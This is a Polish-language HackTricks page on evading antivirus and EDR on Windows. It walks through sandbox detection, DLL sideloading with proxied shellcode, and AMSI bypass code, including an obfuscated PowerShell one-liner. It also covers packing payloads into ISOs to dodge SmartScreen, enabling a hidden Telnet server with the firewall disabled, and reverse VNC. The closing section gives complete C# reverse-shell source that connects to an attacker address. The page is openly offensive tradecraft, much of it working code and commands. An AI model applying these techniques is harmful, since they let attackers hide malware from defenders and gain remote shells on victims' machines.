# Metoda unikania programów antywirusowych (AV)

<details>

<summary><strong>Dowiedz się, jak hakować AWS od zera do bohatera z</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Inne sposoby wsparcia HackTricks:

* Jeśli chcesz zobaczyć swoją **firmę reklamowaną w HackTricks** lub **pobrać HackTricks w formacie PDF**, sprawdź [**PLANY SUBSKRYPCYJNE**](https://github.com/sponsors/carlospolop)!
* Zdobądź [**oficjalne gadżety PEASS & HackTricks**](https://peass.creator-spring.com)
* Odkryj [**Rodzinę PEASS**](https://opensea.io/collection/the-peass-family), naszą kolekcję ekskluzywnych [**NFT**](https://opensea.io/collection/the-peass-family)
* **Dołącz do** 💬 [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **śledź** nas na **Twitterze** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Podziel się swoimi sztuczkami hakerskimi, przesyłając PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) na GitHubie.

</details>

**Ta strona została napisana przez** [**@m2rc\_p**](https://twitter.com/m2rc\_p)**!**

## **Metodologia unikania AV**

Obecnie programy antywirusowe (AV) używają różnych metod sprawdzania, czy plik jest złośliwy, czy nie, statyczną detekcję, analizę dynamiczną i dla bardziej zaawansowanych rozwiązań EDR, analizę behawioralną.

### **Statyczna detekcja**

Statyczna detekcja jest osiągana poprzez oznaczanie znanych złośliwych ciągów znaków lub tablic bajtów w pliku binarnym lub skrypcie, a także wyodrębnianie informacji z samego pliku (np. opis pliku, nazwa firmy, sygnatury cyfrowe, ikona, suma kontrolna, itp.). Oznacza to, że korzystanie z znanych publicznych narzędzi może sprawić, że zostaniesz łatwiej wykryty, ponieważ prawdopodobnie zostały one przeanalizowane i oznaczone jako złośliwe. Istnieje kilka sposobów na obejście tego rodzaju detekcji:

* **Szyfrowanie**

Jeśli zaszyfrujesz plik binarny, AV nie będzie w stanie wykryć twojego programu, ale będziesz potrzebował pewnego rodzaju ładowacza do odszyfrowania i uruchomienia programu w pamięci.

* **Obliteracja**

Czasami wystarczy zmienić niektóre ciągi znaków w swoim pliku binarnym lub skrypcie, aby ominąć AV, ale może to być zadanie czasochłonne, w zależności od tego, co próbujesz zasłonić.

* **Narzędzia niestandardowe**

Jeśli opracowujesz własne narzędzia, nie będzie znanych złych sygnatur, ale wymaga to dużo czasu i wysiłku.

{% hint style="info" %}
Dobrym sposobem sprawdzenia statycznej detekcji Windows Defender jest [ThreatCheck](https://github.com/rasta-mouse/ThreatCheck). W zasadzie dzieli plik na kilka segmentów, a następnie zleca Defenderowi skanowanie każdego z nich osobno, w ten sposób może powiedzieć ci dokładnie, jakie ciągi znaków lub bajtów są oznaczone w twoim pliku.
{% endhint %}

Gorąco polecam obejrzenie tej [playliście na YouTube](https://www.youtube.com/playlist?list=PLj05gPj8rk\_pkb12mDe4PgYZ5qPxhGKGf) dotyczącej praktycznego unikania AV.

### **Analiza dynamiczna**

Analiza dynamiczna polega na uruchomieniu twojego pliku binarnego w piaskownicy i obserwowaniu złośliwej aktywności (np. próba odszyfrowania i odczytu haseł z przeglądarki, wykonywanie minidumpa na LSASS, itp.). Ta część może być nieco trudniejsza do pracy, ale oto kilka rzeczy, które możesz zrobić, aby uniknąć piaskownic.

* **Uśpienie przed wykonaniem** W zależności od tego, jak jest to zaimplementowane, może to być świetny sposób na obejście dynamicznej analizy AV. AV ma bardzo krótki czas na skanowanie plików, aby nie przeszkadzać użytkownikowi w pracy, więc używanie długich uśpienia może zakłócić analizę binarnych plików. Problem polega na tym, że wiele piaskownic AV może po prostu pominąć uśpienie, w zależności od tego, jak jest to zaimplementowane.
* **Sprawdzanie zasobów komputera** Zazwyczaj piaskownice mają bardzo mało zasobów do pracy (np. < 2 GB RAM), w przeciwnym razie mogłyby spowolnić pracę użytkownika. Tutaj również możesz być bardzo kreatywny, na przykład sprawdzając temperaturę procesora lub nawet prędkości wentylatorów, nie wszystko będzie zaimplementowane w piaskownicy.
* **Sprawdzenia specyficzne dla maszyny** Jeśli chcesz skierować się do użytkownika, którego stacja robocza jest dołączona do domeny "contoso.local", możesz sprawdzić domenę komputera, aby sprawdzić, czy pasuje do tej, którą określiłeś, jeśli nie, możesz zmusić swój program do wyjścia.

Okazuje się, że komputer piaskownicy Microsoft Defender ma nazwę HAL9TH, więc możesz sprawdzić nazwę komputera w swoim złośliwym oprogramowaniu przed detenacją, jeśli nazwa pasuje do HAL9TH, oznacza to, że znajdujesz się w piaskownicy defendera, więc możesz zmusić swój program do wyjścia.

<figure><img src="../.gitbook/assets/image (206).png" alt=""><figcaption><p>źródło: <a href="https://youtu.be/StSLxFbVz0M?t=1439">https://youtu.be/StSLxFbVz0M?t=1439</a></p></figcaption></figure>

Kilka innych naprawdę dobrych wskazówek od [@mgeeky](https://twitter.com/mariuszbit) dotyczących walki z piaskownicami

<figure><img src="../.gitbook/assets/image (245).png" alt=""><figcaption><p><a href="https://discord.com/servers/red-team-vx-community-1012733841229746240">Red Team VX Discord</a> #malware-dev channel</p></figcaption></figure>

Jak wspomnieliśmy wcześniej w tym poście, **publiczne narzędzia** w końcu zostaną **wykryte**, więc powinieneś zadać sobie pytanie:

Na przykład, jeśli chcesz wykonać dump LSASS, **czy naprawdę musisz użyć mimikatz**? Czy nie mogłbyś użyć innego projektu, który jest mniej znany i również wykonuje dump LSASS.

Prawdopodobnie właściwą odpowiedzią jest ta druga opcja. Biorąc mimikatz jako przykład, jest to prawdopodobnie jeden z, jeśli nie najbardziej oznaczonych przez AV i EDRs szkodliwych programów, podczas gdy sam projekt jest super, jest to również koszmar, aby pracować z nim w celu uniknięcia AV, więc po prostu poszukaj alternatyw dla tego, co chcesz osiągnąć.

{% hint style="info" %}
Podczas modyfikowania swoich ładunków w celu uniknięcia, upewnij się, że **wyłączysz automatyczne przesyłanie próbek** w defenderze, i proszę, serio, **NIE WYSYŁAJ NA VIRUSTOTAL** jeśli twoim celem jest osiągnięcie uniknięcia na dłuższą metę. Jeśli chcesz sprawdzić, czy twój ładunek jest wykrywany przez określone AV, zainstaluj go na maszynie wirtualnej, spróbuj wyłączyć automatyczne przesyłanie próbek i przetestuj go tam, aż będziesz zadowolony z wyniku.
{% endhint %}

## EXE vs DLL

Zawsze, gdy to możliwe, **zawsze daj pierwszeństwo użyciu DLL-ek do unikania**, moim doświadczeniem, pliki DLL są zazwyczaj **znacznie mniej wykrywane** i analizowane, więc to bardzo prosty trik do użycia w celu uniknięcia wykrycia w niektórych przypadkach (jeśli twój ładunek ma sposób działania jako DLL oczywiście).

Jak widać na tym obrazie, ładunek DLL z Havoc ma wskaźnik wykrywalności 4/26 w antiscan.me, podczas gdy ładunek EXE ma wskaźnik wykrywalności 7/26.

<figure><img src="../.gitbook/assets/image (1127).png" alt=""><figcaption><p>porównanie antiscan.me normalnego ładunku EXE Havoc z normalnym ładunkiem DLL Havoc</p></figcaption></figure>

Teraz pokażemy kilka sztuczek, których możesz użyć z plikami DLL, aby być znacznie bardziej skrytobójczym.
## Wstrzykiwanie DLL i Proxying

**Wstrzykiwanie DLL** wykorzystuje kolejność wyszukiwania DLL używaną przez ładowacz, umieszczając zarówno aplikację ofiarę, jak i złośliwe ładunki obok siebie.

Możesz sprawdzić programy podatne na wstrzykiwanie DLL za pomocą [Siofra](https://github.com/Cybereason/siofra) i następującego skryptu powershell:

{% code overflow="wrap" %}
```powershell
Get-ChildItem -Path "C:\Program Files\" -Filter *.exe -Recurse -File -Name| ForEach-Object {
$binarytoCheck = "C:\Program Files\" + $_
C:\Users\user\Desktop\Siofra64.exe --mode file-scan --enum-dependency --dll-hijack -f $binarytoCheck
}
```
{% endcode %}

To polecenie wyświetli listę programów podatnych na przejęcie DLL w "C:\Program Files\\" oraz pliki DLL, które próbują załadować.

Gorąco zalecam **samodzielne zbadanie programów podatnych na przejęcie DLL/Sideloadable**, ta technika jest dość skryta, jeśli jest wykonana poprawnie, ale jeśli używasz publicznie znanych programów Sideloadable DLL, możesz łatwo zostać wykryty.

Po prostu umieszczenie złośliwej DLL o nazwie, którą program oczekuje załadować, nie spowoduje załadowania twojego ładunku, ponieważ program oczekuje określonych funkcji wewnątrz tej DLL. Aby rozwiązać ten problem, skorzystamy z innej techniki o nazwie **DLL Proxying/Forwarding**.

**DLL Proxying** przekierowuje wywołania, które program wykonuje z poziomu proxy (i złośliwej) DLL do oryginalnej DLL, zachowując tym samym funkcjonalność programu i umożliwiając obsługę wykonania twojego ładunku.

Będę korzystał z projektu [SharpDLLProxy](https://github.com/Flangvik/SharpDllProxy) autorstwa [@flangvik](https://twitter.com/Flangvik/)

Oto kroki, które postępowałem:

{% code overflow="wrap" %}
```
1. Find an application vulnerable to DLL Sideloading (siofra or using Process Hacker)
2. Generate some shellcode (I used Havoc C2)
3. (Optional) Encode your shellcode using Shikata Ga Nai (https://github.com/EgeBalci/sgn)
4. Use SharpDLLProxy to create the proxy dll (.\SharpDllProxy.exe --dll .\mimeTools.dll --payload .\demon.bin)
```
{% endcode %}

Ostatnie polecenie dostarczy nam 2 pliki: szablon kodu źródłowego DLL i oryginalne przemianowane DLL.

<figure><img src="../.gitbook/assets/sharpdllproxy.gif" alt=""><figcaption></figcaption></figure>

{% code overflow="wrap" %}
```
5. Create a new visual studio project (C++ DLL), paste the code generated by SharpDLLProxy (Under output_dllname/dllname_pragma.c) and compile. Now you should have a proxy dll which will load the shellcode you've specified and also forward any calls to the original DLL.
```
{% endcode %}

Oto wyniki:

<figure><img src="../.gitbook/assets/dll_sideloading_demo.gif" alt=""><figcaption></figcaption></figure>

Zarówno nasz shellcode (zakodowany za pomocą [SGN](https://github.com/EgeBalci/sgn)), jak i proxy DLL mają wskaźnik wykrywalności 0/26 w [antiscan.me](https://antiscan.me)! Nazwałbym to sukcesem.

<figure><img src="../.gitbook/assets/image (190).png" alt=""><figcaption></figcaption></figure>

{% hint style="info" %}
**Gorąco polecam** obejrzenie [twitch VOD S3cur3Th1sSh1t](https://www.twitch.tv/videos/1644171543) na temat DLL Sideloading oraz również [filmu ippsec'a](https://www.youtube.com/watch?v=3eROsG\_WNpE), aby dowiedzieć się więcej o tym, o czym rozmawialiśmy bardziej szczegółowo.
{% endhint %}

## [**Freeze**](https://github.com/optiv/Freeze)

`Freeze to zestaw narzędzi do łamania EDRs za pomocą zawieszonych procesów, bezpośrednich wywołań systemowych i alternatywnych metod wykonania`

Możesz użyć Freeze do załadowania i wykonania swojego shellcode w dyskretny sposób.
```
Git clone the Freeze repo and build it (git clone https://github.com/optiv/Freeze.git && cd Freeze && go build Freeze.go)
1. Generate some shellcode, in this case I used Havoc C2.
2. ./Freeze -I demon.bin -encrypt -O demon.exe
3. Profit, no alerts from defender
```
<figure><img src="../.gitbook/assets/freeze_demo_hacktricks.gif" alt=""><figcaption></figcaption></figure>

{% hint style="info" %}
Unikanie jest jak grę w kotka i myszkę, to co działa dzisiaj, może być wykryte jutro, dlatego nigdy nie polegaj tylko na jednym narzędziu, jeśli to możliwe, spróbuj łączyć kilka technik unikania.
{% endhint %}

## AMSI (Interfejs Skanowania Antywirusowego)

AMSI został stworzony, aby zapobiegać "[malware'owi bezplikowemu](https://en.wikipedia.org/wiki/Fileless\_malware)". Początkowo programy antywirusowe były w stanie skanować **pliki na dysku**, więc jeśli udało ci się uruchomić ładunki **bezpośrednio w pamięci**, program antywirusowy nie mógł nic zrobić, ponieważ nie miał wystarczającej widoczności.

Funkcja AMSI jest zintegrowana w te komponenty systemu Windows.

* Kontrola konta użytkownika, czyli UAC (podnoszenie uprawnień plików EXE, COM, MSI lub instalacji ActiveX)
* PowerShell (skrypty, interaktywne użycie i dynamiczna ocena kodu)
* Host skryptów systemu Windows (wscript.exe i cscript.exe)
* JavaScript i VBScript
* Makra VBA programu Office

Pozwala rozwiązaniom antywirusowym inspekcjonować zachowanie skryptów, ujawniając zawartość skryptu w formie niezaszyfrowanej i niezakamuflowanej.

Uruchomienie `IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1')` spowoduje wyświetlenie następującego alertu w programie Windows Defender.

<figure><img src="../.gitbook/assets/image (1132).png" alt=""><figcaption></figcaption></figure>

Zauważ, jak dodaje prefiks `amsi:` a następnie ścieżkę do pliku wykonywalnego, z którego uruchomiono skrypt, w tym przypadku powershell.exe

Nie zapisaliśmy żadnego pliku na dysku, ale i tak zostaliśmy wykryci w pamięci z powodu AMSI.

Istnieje kilka sposobów obejścia AMSI:

* **Obufuskowanie**

Ponieważ AMSI głównie działa z wykrywaniem statycznym, zmodyfikowanie skryptów, które próbujesz załadować, może być dobrym sposobem na uniknięcie wykrycia.

Jednak AMSI ma zdolność do odszyfrowywania skryptów nawet jeśli mają one wiele warstw, więc obfuskacja może być złym wyborem w zależności od tego, jak jest wykonana. Sprawia to, że unikanie nie jest tak proste. Chociaż czasami wystarczy zmienić kilka nazw zmiennych i będzie dobrze, więc zależy to od tego, ile coś zostało oznaczone.

* **Ominięcie AMSI**

Ponieważ AMSI jest implementowany poprzez załadowanie biblioteki DLL do procesu powershell (również cscript.exe, wscript.exe, itp.), jest możliwe łatwe manipulowanie nim nawet uruchamiając się jako użytkownik bez uprawnień. Ze względu na tę wadę w implementacji AMSI, badacze znaleźli kilka sposobów na uniknięcie skanowania AMSI.

**Wymuszenie błędu**

Wymuszenie niepowodzenia inicjalizacji AMSI (amsiInitFailed) spowoduje, że nie zostanie uruchomione skanowanie dla bieżącego procesu. Początkowo zostało to ujawnione przez [Matt Graeber](https://twitter.com/mattifestation), a Microsoft opracował sygnaturę, aby zapobiec szerszemu użyciu.

{% code overflow="wrap" %}
```powershell
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
```
{% endcode %}

Wystarczyła jedna linia kodu PowerShell, aby uniemożliwić użycie AMSI dla bieżącego procesu PowerShell. Oczywiście ta linia została wykryta przez AMSI, więc konieczne jest wprowadzenie pewnych modyfikacji, aby skorzystać z tej techniki.

Oto zmodyfikowane obejście AMSI, które znalazłem w tym [Github Gist](https://gist.github.com/r00t-3xp10it/a0c6a368769eec3d3255d4814802b5db).
```powershell
Try{#Ams1 bypass technic nº 2
$Xdatabase = 'Utils';$Homedrive = 'si'
$ComponentDeviceId = "N`onP" + "ubl`ic" -join ''
$DiskMgr = 'Syst+@.MÂ£nÂ£g' + 'e@+nt.Auto@' + 'Â£tion.A' -join ''
$fdx = '@ms' + 'Â£InÂ£' + 'tF@Â£' + 'l+d' -Join '';Start-Sleep -Milliseconds 300
$CleanUp = $DiskMgr.Replace('@','m').Replace('Â£','a').Replace('+','e')
$Rawdata = $fdx.Replace('@','a').Replace('Â£','i').Replace('+','e')
$SDcleanup = [Ref].Assembly.GetType(('{0}m{1}{2}' -f $CleanUp,$Homedrive,$Xdatabase))
$Spotfix = $SDcleanup.GetField($Rawdata,"$ComponentDeviceId,Static")
$Spotfix.SetValue($null,$true)
}Catch{Throw $_}
```
**Modyfikacja pamięci**

Ta technika została początkowo odkryta przez [@RastaMouse](https://twitter.com/\_RastaMouse/) i polega na znalezieniu adresu funkcji "AmsiScanBuffer" w amsi.dll (odpowiedzialnej za skanowanie dostarczonych przez użytkownika danych wejściowych) i nadpisaniu jej instrukcjami zwracającymi kod dla E\_INVALIDARG, w ten sposób wynik rzeczywistego skanu zwróci 0, co jest interpretowane jako czysty wynik.

{% hint style="info" %}
Proszę przeczytać [https://rastamouse.me/memory-patching-amsi-bypass/](https://rastamouse.me/memory-patching-amsi-bypass/) dla bardziej szczegółowego wyjaśnienia.
{% endhint %}

Istnieje wiele innych technik używanych do ominięcia AMSI za pomocą powershell, sprawdź [**tę stronę**](basic-powershell-for-pentesters/#amsi-bypass) oraz [ten repozytorium](https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell), aby dowiedzieć się więcej na ich temat.

## Obfuskacja

Istnieje kilka narzędzi, które można użyć do **obfuskacji jawnego kodu C#**, generowania **szablonów metaprogramowania** do kompilowania binariów lub **obfuskacji skompilowanych binariów**, takich jak:

* [**InvisibilityCloak**](https://github.com/h4wkst3r/InvisibilityCloak)**: Obfuskator C#**
* [**Obfuscator-LLVM**](https://github.com/obfuscator-llvm/obfuscator): Celem tego projektu jest dostarczenie otwartej wersji [LLVM](http://www.llvm.org/), która zapewnia zwiększone bezpieczeństwo oprogramowania poprzez [obfuskację kodu](http://en.wikipedia.org/wiki/Obfuscation\_\(software\)) i zabezpieczenie przed ingerencją.
* [**ADVobfuscator**](https://github.com/andrivet/ADVobfuscator): ADVobfuscator pokazuje, jak używać języka `C++11/14` do generowania, w czasie kompilacji, zasłoniętego kodu bez użycia zewnętrznego narzędzia i bez modyfikowania kompilatora.
* [**obfy**](https://github.com/fritzone/obfy): Dodaje warstwę zasłoniętych operacji generowanych przez szkielet metaprogramowania C++, co utrudni osobie chcącej złamać aplikację życie.
* [**Alcatraz**](https://github.com/weak1337/Alcatraz)**:** Alcatraz to obfuskator binarny x64, który potrafi obfuskować różne pliki pe, w tym: .exe, .dll, .sys
* [**metame**](https://github.com/a0rtega/metame): Metame to prosty silnik kodu metamorficznego dla dowolnych plików wykonywalnych.
* [**ropfuscator**](https://github.com/ropfuscator/ropfuscator): ROPfuscator to zaawansowany framework obfuskacji kodu na poziomie kodu asemblera dla języków obsługiwanych przez LLVM, wykorzystujący ROP (programowanie zwracające się). ROPfuscator obfuskuje program na poziomie kodu asemblera, przekształcając zwykłe instrukcje w łańcuchy ROP, zwalczając nasze naturalne pojęcie normalnego przepływu sterowania.
* [**Nimcrypt**](https://github.com/icyguider/nimcrypt): Nimcrypt to krypter .NET PE napisany w Nim
* [**inceptor**](https://github.com/klezVirus/inceptor)**:** Inceptor jest w stanie przekształcić istniejące pliki EXE/DLL w kod shellcode, a następnie załadować je

## SmartScreen & MoTW

Możesz zobaczyć ten ekran podczas pobierania niektórych plików wykonywalnych z internetu i ich uruchamiania.

Microsoft Defender SmartScreen to mechanizm bezpieczeństwa mający na celu ochronę użytkownika końcowego przed uruchamianiem potencjalnie złośliwych aplikacji.

<figure><img src="../.gitbook/assets/image (661).png" alt=""><figcaption></figcaption></figure>

SmartScreen głównie działa w oparciu o podejście oparte na reputacji, co oznacza, że pobieranie aplikacji rzadkości spowoduje uruchomienie SmartScreen, co ostrzeże i uniemożliwi użytkownikowi końcowemu uruchomienie pliku (choć plik można nadal uruchomić, klikając Więcej informacji -> Uruchom w każdym razie).

**MoTW** (Mark of The Web) to [Alternatywny Strumień Danych NTFS](https://en.wikipedia.org/wiki/NTFS#Alternate\_data\_stream\_\(ADS\)) o nazwie Zone.Identifier, który jest automatycznie tworzony podczas pobierania plików z internetu, wraz z adresem URL, z którego został pobrany.

<figure><img src="../.gitbook/assets/image (234).png" alt=""><figcaption><p>Sprawdzanie alternatywnego strumienia danych Zone.Identifier dla pliku pobranego z internetu.</p></figcaption></figure>

{% hint style="info" %}
Warto zauważyć, że pliki wykonywalne podpisane **zaufanym** certyfikatem **nie spowodują uruchomienia SmartScreen**.
{% endhint %}

Bardzo skutecznym sposobem zapobiegania otrzymywaniu znaku Mark of The Web przez twoje ładunki jest umieszczenie ich w pewnego rodzaju kontenerze, takim jak ISO. Dzieje się tak, ponieważ Mark-of-the-Web (MOTW) **nie może** być stosowany do **woluminów nie NTFS**.

<figure><img src="../.gitbook/assets/image (636).png" alt=""><figcaption></figcaption></figure>

[**PackMyPayload**](https://github.com/mgeeky/PackMyPayload/) to narzędzie, które pakuje ładunki do kontenerów wyjściowych, aby uniknąć oznaczenia Mark-of-the-Web.

Przykładowe użycie:
```powershell
PS C:\Tools\PackMyPayload> python .\PackMyPayload.py .\TotallyLegitApp.exe container.iso

+      o     +              o   +      o     +              o
+             o     +           +             o     +         +
o  +           +        +           o  +           +          o
-_-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-_-_-_-_-_-_-_,------,      o
:: PACK MY PAYLOAD (1.1.0)       -_-_-_-_-_-_-|   /\_/\
for all your container cravings   -_-_-_-_-_-~|__( ^ .^)  +    +
-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-__-_-_-_-_-_-_-''  ''
+      o         o   +       o       +      o         o   +       o
+      o            +      o    ~   Mariusz Banach / mgeeky    o
o      ~     +           ~          <mb [at] binary-offensive.com>
o           +                         o           +           +

[.] Packaging input file to output .iso (iso)...
Burning file onto ISO:
Adding file: /TotallyLegitApp.exe

[+] Generated file written to (size: 3420160): container.iso
```
Oto demo omijania SmartScreen poprzez pakowanie ładunków w plikach ISO za pomocą [PackMyPayload](https://github.com/mgeeky/PackMyPayload/)

<figure><img src="../.gitbook/assets/packmypayload_demo.gif" alt=""><figcaption></figcaption></figure>

## Refleksja Zbioru C#

Ładowanie binarnych plików C# do pamięci jest znane od dłuższego czasu i nadal jest bardzo dobrym sposobem uruchamiania narzędzi post-eksploatacyjnych bez wykrycia przez AV.

Ponieważ ładunek zostanie załadowany bezpośrednio do pamięci bez dotykania dysku, będziemy musieli jedynie zająć się łatanie AMSI dla całego procesu.

Większość frameworków C2 (sliver, Covenant, metasploit, CobaltStrike, Havoc, itp.) już umożliwia wykonanie zbiorów C# bezpośrednio w pamięci, ale istnieją różne sposoby tego wykonania:

* **Fork\&Run**

Polega na **uruchomieniu nowego procesu ofiarnego**, wstrzyknięciu złośliwego kodu post-eksploatacyjnego do tego nowego procesu, wykonaniu złośliwego kodu i po zakończeniu zabicia nowego procesu. Metoda fork and run ma swoje zalety i wady. Zaletą tej metody jest to, że wykonanie następuje **poza** naszym procesem implantu Beacon. Oznacza to, że jeśli coś pójdzie nie tak lub zostanie wykryte w naszej akcji post-eksploatacyjnej, istnieje **dużo większa szansa** na **przeżycie implantu.** Wadą jest **większe ryzyko** wykrycia przez **Wykrywanie Zachowań**.

<figure><img src="../.gitbook/assets/image (212).png" alt=""><figcaption></figcaption></figure>

* **Inline**

Polega na wstrzyknięciu złośliwego kodu post-eksploatacyjnego **do własnego procesu**. W ten sposób można uniknąć tworzenia nowego procesu i skanowania go przez AV, ale wadą jest to, że jeśli coś pójdzie nie tak podczas wykonywania ładunku, istnieje **dużo większe ryzyko** **utrata beaconu**, ponieważ może on ulec awarii.

<figure><img src="../.gitbook/assets/image (1133).png" alt=""><figcaption></figcaption></figure>

{% hint style="info" %}
Jeśli chcesz dowiedzieć się więcej o ładowaniu zbiorów C#, zapoznaj się z tym artykułem [https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/](https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/) oraz ich InlineExecute-Assembly BOF ([https://github.com/xforcered/InlineExecute-Assembly](https://github.com/xforcered/InlineExecute-Assembly))
{% endhint %}

Możesz również ładować zbiory C# **z PowerShell**, sprawdź [Invoke-SharpLoader](https://github.com/S3cur3Th1sSh1t/Invoke-SharpLoader) oraz [film S3cur3th1sSh1t](https://www.youtube.com/watch?v=oe11Q-3Akuk).

## Korzystanie z Innych Języków Programowania

Zaproponowane w [**https://github.com/deeexcee-io/LOI-Bins**](https://github.com/deeexcee-io/LOI-Bins), jest możliwe wykonanie złośliwego kodu za pomocą innych języków, udostępniając zainfekowanej maszynie dostęp **do środowiska interpretera zainstalowanego na kontrolowanym przez atakującego udziale SMB**.

Pozwalając na dostęp do binarnych interpreterów i środowiska na udziale SMB, można **wykonać dowolny kod w tych językach w pamięci** zainfekowanej maszyny.

Repozytorium wskazuje: Defender nadal skanuje skrypty, ale korzystając z Go, Java, PHP itp. mamy **większą elastyczność w omijaniu statycznych sygnatur**. Testowanie losowych niezaciemnionych skryptów powłamania zwrotnego w tych językach udowodniło swoją skuteczność.

## Zaawansowane Unikanie

Unikanie jest bardzo skomplikowanym tematem, czasami trzeba wziąć pod uwagę wiele różnych źródeł telemetrii w jednym systemie, więc jest praktycznie niemożliwe pozostanie całkowicie niezauważonym w dojrzałych środowiskach.

Każde środowisko, z którym się zetkniesz, będzie miało swoje mocne i słabe strony.

Gorąco zachęcam do obejrzenia tego wystąpienia od [@ATTL4S](https://twitter.com/DaniLJ94), aby uzyskać wgląd w bardziej zaawansowane techniki unikania.

{% embed url="https://vimeo.com/502507556?embedded=true&owner=32913914&source=vimeo_logo" %}

To także kolejne świetne wystąpienie od [@mariuszbit](https://twitter.com/mariuszbit) na temat Unikania w Głębi.

{% embed url="https://www.youtube.com/watch?v=IbA7Ung39o4" %}

## **Stare Techniki**

### **Sprawdź, które części Defender uznaje za złośliwe**

Możesz użyć [**ThreatCheck**](https://github.com/rasta-mouse/ThreatCheck), który **usunie części binarne**, aż **dowie się, która część Defendera** uznaje za złośliwą i podzieli to z tobą.\
Innym narzędziem, które robi to **samo, jest** [**avred**](https://github.com/dobin/avred) z otwartą ofertą usługi w [**https://avred.r00ted.ch/**](https://avred.r00ted.ch/)
```bash
pkgmgr /iu:"TelnetServer" /quiet
```
Uruchom go **po uruchomieniu** systemu i **uruchom** go teraz:
```bash
sc config TlntSVR start= auto obj= localsystem
```
**Zmień port telnet** (stealth) i wyłącz zapórę sieciową:
```
tlntadmn config port=80
netsh advfirewall set allprofiles state off
```
### UltraVNC

Pobierz go z: [http://www.uvnc.com/downloads/ultravnc.html](http://www.uvnc.com/downloads/ultravnc.html) (chcesz pobrać pliki binarne, a nie instalator)

**NA HOSTINGU**: Uruchom _**winvnc.exe**_ i skonfiguruj serwer:

* Włącz opcję _Disable TrayIcon_
* Ustaw hasło w _VNC Password_
* Ustaw hasło w _View-Only Password_

Następnie przenieś plik binarny _**winvnc.exe**_ oraz **nowo** utworzony plik _**UltraVNC.ini**_ do **ofiary**

#### **Połączenie odwrotne**

**Atakujący** powinien **wykonać wewnątrz** swojego **hostingu** plik binarny `vncviewer.exe -listen 5900`, aby był **gotowy** do przechwycenia odwrotnej **łączności VNC**. Następnie, wewnątrz **ofiary**: Uruchom demona winvnc `winvnc.exe -run` i uruchom `winwnc.exe [-autoreconnect] -connect <attacker_ip>::5900`

**OSTRZEŻENIE:** Aby zachować ukrycie, musisz unikać kilku rzeczy

* Nie uruchamiaj `winvnc`, jeśli już działa, w przeciwnym razie wywołasz [okienko popup](https://i.imgur.com/1SROTTl.png). Sprawdź, czy działa, używając `tasklist | findstr winvnc`
* Nie uruchamiaj `winvnc` bez pliku `UltraVNC.ini` w tym samym katalogu, w przeciwnym razie spowoduje to otwarcie [okna konfiguracyjnego](https://i.imgur.com/rfMQWcf.png)
* Nie uruchamiaj `winvnc -h` dla pomocy, w przeciwnym razie wywołasz [okienko popup](https://i.imgur.com/oc18wcu.png)

### GreatSCT

Pobierz go z: [https://github.com/GreatSCT/GreatSCT](https://github.com/GreatSCT/GreatSCT)
```
git clone https://github.com/GreatSCT/GreatSCT.git
cd GreatSCT/setup/
./setup.sh
cd ..
./GreatSCT.py
```
Wewnątrz GreatSCT:
```
use 1
list #Listing available payloads
use 9 #rev_tcp.py
set lhost 10.10.14.0
sel lport 4444
generate #payload is the default name
#This will generate a meterpreter xml and a rcc file for msfconsole
```
Teraz **uruchom nasłuchiwacz** za pomocą `msfconsole -r file.rc` i **wykonaj** **payload xml** za pomocą:
```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe payload.xml
```
**Obecny obrońca szybko zakończy proces.**

### Kompilacja naszego własnego odwróconego powłoki

https://medium.com/@Bank_Security/undetectable-c-c-reverse-shells-fab4c0ec4f15

#### Pierwsza odwrócona powłoka C#

Skompiluj to za pomocą:
```
c:\windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /t:exe /out:back2.exe C:\Users\Public\Documents\Back1.cs.txt
```
Użyj tego z:
```
back.exe <ATTACKER_IP> <PORT>
```

```csharp
// From https://gist.githubusercontent.com/BankSecurity/55faad0d0c4259c623147db79b2a83cc/raw/1b6c32ef6322122a98a1912a794b48788edf6bad/Simple_Rev_Shell.cs
using System;
using System.Text;
using System.IO;
using System.Diagnostics;
using System.ComponentModel;
using System.Linq;
using System.Net;
using System.Net.Sockets;


namespace ConnectBack
{
public class Program
{
static StreamWriter streamWriter;

public static void Main(string[] args)
{
using(TcpClient client = new TcpClient(args[0], System.Convert.ToInt32(args[1])))
{
using(Stream stream = client.GetStream())
{
using(StreamReader rdr = new StreamReader(stream))
{
streamWriter = new StreamWriter(stream);

StringBuilder strInput = new StringBuilder();

Process p = new Process();
p.StartInfo.FileName = "cmd.exe";
p.StartInfo.CreateNoWindow = true;
p.StartInfo.UseShellExecute = false;
p.StartInfo.RedirectStandardOutput = true;
p.StartInfo.RedirectStandardInput = true;
p.StartInfo.RedirectStandardError = true;
p.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);
p.Start();
p.BeginOutputReadLine();

while(true)
{
strInput.Append(rdr.ReadLine());
//strInput.Append("\n");
p.StandardInput.WriteLine(strInput);
strInput.Remove(0, strInput.Length);
}
}
}
}
}

private static void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)
{
StringBuilder strOutput = new StringBuilder();

if (!String.IsNullOrEmpty(outLine.Data))
{
try
{
strOutput.Append(outLine.Data);
streamWriter.WriteLine(strOutput);
streamWriter.Flush();
}
catch (Exception err) { }
}
}

}
}
```
### C# za pomocą kompilatora
```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt.txt REV.shell.txt
```
[REV.txt: https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066](https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066)

